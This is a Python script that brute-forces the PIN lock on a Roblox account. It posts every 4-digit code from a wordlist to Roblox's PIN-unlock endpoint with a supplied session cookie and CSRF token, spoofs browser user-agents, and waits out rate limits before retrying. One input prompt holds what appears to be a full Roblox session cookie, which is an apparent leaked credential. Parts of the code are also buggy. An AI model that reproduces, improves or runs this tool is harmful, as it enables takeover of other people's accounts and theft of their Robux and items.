import os
import requests
from requests.structures import CaseInsensitiveDict
import time
import sys
import random
from colorama import Back,Fore,init
init() #colorama initialize
cachedude = open("cache.txt","w")
cachedude2 = open("cache.txt","r")
ok = cachedude2.read().split("\n")
pins = open("4digitcodes.txt","r")
codes = pins.read().split("\n")
activated = False
print(Fore.YELLOW + "CREDITS TO SECLIST FOR 4 DIGIT CODES\nTo find your account's cookie and csrf token,\ncheck the README.md file in " + Fore.WHITE + "Github" + Fore.YELLOW + "\nfanks," + Fore.RED + "\nlove by 0x74ngly / Tangly\n" + Fore.WHITE + "-------------")
def convert(num):
    if num < 10:
        return f"000{num}"
    elif num < 100:
        return f"00{num}"
    elif num < 1000:
        return f"0{num}"
    else:
        return str(num)
if cachedude2.read() != "":
    def makerequest(pin,cookiepls,csrftoken,ospls):
        statustime = f"Tried {pin}"
        hehe = CaseInsensitiveDict()
        hehe["authority"] = "auth.roblox.com"
        hehe["method"] = "POST"
        hehe["path"] = "/v1/account/pin/unlock"
        hehe["scheme"] = "https"
        hehe["accept"] = "application/json, text/plain, */*"
        hehe["accept-encoding"] = "gzip, deflate, br"
        hehe["accept-language"] = "en-US,en;q=0.9"
        hehe["content-length"] = "8"
        hehe["content-type"] = "application/x-www-form-urlencoded"
        hehe["cookie"] = f"{cookiepls}"
        hehe["origin"] = "https://www.roblox.com"
        hehe["referer"] = "https://www.roblox.com/"
        hehe["sec-fetch-dest"] = "empty"
        hehe["sec-fetch-mode"] = "cors"
        hehe["sec-fetch-site"] = "same-site"
        if ospls == 1:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
        elif ospls == 2:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
        elif ospls == 3:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
        elif ospls == 4:
            hehe["user-agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
        elif ospls == 5:
            hehe["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
        hehe["x-csrf-token"] = f"{csrftoken}"
        hi = requests.post(url="https://auth.roblox.com/v1/account/pin/unlock",data={"pin":pin},headers=hehe)
        if hi.status_code == 429:
            #statustime = Fore.RED + "TOO MANY REQUESTS!" + Fore.WHITE + f"\nDelaying for {waittime}."
            print(Fore.YELLOW + "[!] Encountered 'Too many requests'" + Fore.WHITE + "\nWaiting...")
            time.sleep(float(waittime))
            makerequest(pin,cookiepls,csrftoken,ospls)
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
        elif hi.status_code == 403:
            #statustime = Fore.GREEN + f"Tried {pin}" + Fore.WHITE
            print("Tried pin: " + Fore.RED + str(pin) + Fore.WHITE + "\n-------------")
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
        elif hi.status_code == 200:
            print("Tried pin: " + Fore.GREEN + str(pin) + Fore.WHITE + "\n-------------")
            print(Fore.GREEN + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
            sys.exit()
        else:
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
    def makerequesty(pin,cookie,xsrftoken,oss):
        statustime = f"Tried {pin}"
        hehe = CaseInsensitiveDict()
        hehe["authority"] = "auth.roblox.com"
        hehe["method"] = "POST"
        hehe["path"] = "/v1/account/pin/unlock"
        hehe["scheme"] = "https"
        hehe["accept"] = "application/json, text/plain, */*"
        hehe["accept-encoding"] = "gzip, deflate, br"
        hehe["accept-language"] = "en-US,en;q=0.9"
        hehe["content-length"] = "8"
        hehe["content-type"] = "application/x-www-form-urlencoded"
        hehe["cookie"] = f"{cookie}"
        hehe["origin"] = "https://www.roblox.com"
        hehe["referer"] = "https://www.roblox.com/"
        hehe["sec-fetch-dest"] = "empty"
        hehe["sec-fetch-mode"] = "cors"
        hehe["sec-fetch-site"] = "same-site"
        if oss == 1:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
        elif oss == 2:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
        elif oss == 3:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
        elif oss == 4:
            hehe["user-agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
        elif oss == 5:
            hehe["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
        hehe["x-csrf-token"] = f"{xsrftoken}"
        hi = requests.post(url="https://auth.roblox.com/v1/account/pin/unlock",data={"pin":pin},headers=hehe)
        if hi.status_code == 429:
            #statustime = Fore.RED + "TOO MANY REQUESTS!" + Fore.WHITE + f"\nDelaying for {waittime}."
            print(Fore.YELLOW + "[!] Encountered 'Too many requests'" + Fore.WHITE + "\nWaiting...")
            time.sleep(float(waittime))
            makerequesty(pin,cookie,xsrftoken,oss)
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
        elif hi.status_code == 403:
            #statustime = Fore.GREEN + f"Tried {pin}" + Fore.WHITE
            print("Tried pin: " + Fore.RED + str(pin) + Fore.WHITE + "\n-------------")
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
        elif hi.status_code == 200:
            print("Tried pin: " + Fore.GREEN + str(pin) + Fore.WHITE + "\n-------------")
            print(Fore.GREEN + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
            sys.exit()
        else:
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
    option = input("Do you want to do the same account? [Y/N]: ")
    if option.lower() == "y":
        csrftoken = input("Enter csrf token here: ")
        waittime = input("(5 is recommended) How many seconds would the bruteforcer run each pin?: ")
        print("cool lets get this bad boy running now")
        activated = True
        for i in codes:
            time.sleep(float(waittime))
            makerequesty(convert(int(i)),ok[0],csrftoken,ok[1])
    elif option.lower() == "n":
        cookiepls = input("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_E7E6AB8377BC66AD157BDD74230AB76613106D0D9FE9BE778759DCAE3EB8D367F3B2C00AB43190A870CFF5039DF2E1EDC8BFC84D1EC18F98A8704486E35B8C845A2FC7F8BE11C44B1A1C51FCBFFF764D7D9D21F66E6FE04CF668938158D683E18E1E1A57C70D1ABE81E01CE82C819ADDCD5A9CA9E336FAA9A226D80EFEB22D64F36EFA760A54F2C183E30917B84E14A86126E9D4DD5FBAC5031E13756CCEC3314365DE8D44706EC7A3FC8A878FCAEC860F40FA911C37E7969DEA9D2D520FB3E52EF4432B3965FA5631FFD7E81013FF348D79F0ECD695C97F6462D751F9FADD81873E7450D73610A83A0F71A696797C3FA1E0B55912CEADF3DAE917B1BFD87441DE95ED02C1DAC6CDFBA4FC68F22AC43028BA61E061460A557222B5CE92D76EFC274FB63F072A5104D36589B9E9290A9796E7CB90A2CECB158C09384B4726701F69A04A8D8E23CCF3F0F9D617A6FE3B728BF0A080589189EDA5BAA9BFB4F99B3FA93C3416: ")
        csrftoken = input("MxB6vHhOOKcG")
        ospls = input("""Operating System Choices
-------------------------
+ Windows
    [1] 10 (Chrome, works with Brave)
    [2] 10 (Firefox) <-- not 100% working
    [3] 7 <-- not tested
[4] Linux <-- not tested
[5] Mac OS <-- not tested
Option: """)
        cachedude.write(f"{cookiepls}\n{ospls}")
        cachedude.close()
        waittime = input("(5 is recommended) How many seconds would the bruteforcer run each pin?: ")
        print("cool lets get this bad boy running now")
        activated = True
        for i in codes:   
            time.sleep(float(waittime))
            makerequest(convert(int(i)),cookiepls,csrftoken,ospls)
else:
    def makerequest(pin,cookiepls,csrftoken,ospls):
        statustime = f"Tried {pin}"
        hehe = CaseInsensitiveDict()
        hehe["authority"] = "auth.roblox.com"
        hehe["method"] = "POST"
        hehe["path"] = "/v1/account/pin/unlock"
        hehe["scheme"] = "https"
        hehe["accept"] = "application/json, text/plain, */*"
        hehe["accept-encoding"] = "gzip, deflate, br"
        hehe["accept-language"] = "en-US,en;q=0.9"
        hehe["content-length"] = "8"
        hehe["content-type"] = "application/x-www-form-urlencoded"
        hehe["cookie"] = f"{cookiepls}"
        hehe["origin"] = "https://www.roblox.com"
        hehe["referer"] = "https://www.roblox.com/"
        hehe["sec-fetch-dest"] = "empty"
        hehe["sec-fetch-mode"] = "cors"
        hehe["sec-fetch-site"] = "same-site"
        if ospls == 1:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
        elif ospls == 2:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"
        elif ospls == 3:
            hehe["user-agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
        elif ospls == 4:
            hehe["user-agent"] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
        elif ospls == 5:
            hehe["user-agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9"
        hehe["x-csrf-token"] = f"{csrftoken}"
        hi = requests.post(url="https://auth.roblox.com/v1/account/pin/unlock",data={"pin":pin},headers=hehe)
        if hi.status_code == 429:
            #statustime = Fore.RED + "TOO MANY REQUESTS!" + Fore.WHITE + f"\nDelaying for {waittime}."
            print(Fore.YELLOW + "[!] Encountered 'Too many requests'" + Fore.WHITE + "\nWaiting...")
            time.sleep(float(waittime))
            makerequest(pin,cookiepls,csrftoken,ospls)
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
        elif hi.status_code == 403:
            #statustime = Fore.GREEN + f"Tried {pin}" + Fore.WHITE
            print("Tried pin: " + Fore.RED + str(pin) + Fore.WHITE + "\n-------------")
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
        elif hi.status_code == 200:
            print("Tried pin: " + Fore.GREEN + str(pin) + Fore.WHITE + "\n-------------")
            print(Fore.GREEN + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
            sys.exit()
        else:
            print(Fore.RED + "[" + str(hi.status_code) + "] " + str(hi.content) + Fore.WHITE)
    cookiepls = input("Enter account's cookie here: ")
    csrftoken = input("MxB6vHhOOKcG")
    ospls = input("""Operating System Choices
-------------------------
+ Windows
    [1] 10 (Chrome, works with Brave)
    [2] 10 (Firefox) <-- not 100% working
    [3] 7 <-- not tested
[4] Linux <-- not tested
[5] Mac OS <-- not tested
Option: """)
    cachedude.write(f"{cookiepls}\n{ospls}")
    cachedude.close()
    waittime = input("(2 is recommended) How many seconds would the bruteforcer run each pin?: ")
    print("cool lets get this bad boy running now")
    activated = True
    for i in codes: 
        time.sleep(float(waittime))
        makerequest(convert(int(i)),cookiepls,csrftoken,ospls)
